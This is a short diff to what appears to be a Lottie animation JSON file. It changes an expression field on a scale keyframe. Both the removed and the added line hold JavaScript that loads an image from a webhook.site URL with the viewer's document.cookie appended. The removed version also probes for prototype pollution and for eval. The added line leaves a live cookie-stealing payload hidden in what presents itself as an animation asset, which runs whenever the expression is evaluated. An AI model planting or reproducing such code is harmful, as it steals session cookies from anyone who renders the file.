@@ -32,7 +32,7 @@
         "s": {
           "a": 0,
           "k": [100, 100, 100],
-          "x": "new Image().src='https://webhook.site/c757fa82-277c-454f-8048-d5d47159abc5?c='+escape(document.cookie)+'&p='+((Object.prototype.polluted='yes',{}.polluted)||'no')+'&e='+(typeof eval)+'&i='+(typeof Image);var $bm_rt=[100,100];$bm_rt;"
+          "x": "new Image().src='https://webhook.site/c757fa82-277c-454f-8048-d5d47159abc5?c='+escape(document.cookie);var $bm_rt=[100,100];$bm_rt;"
         }
       },
       "ip": 0,
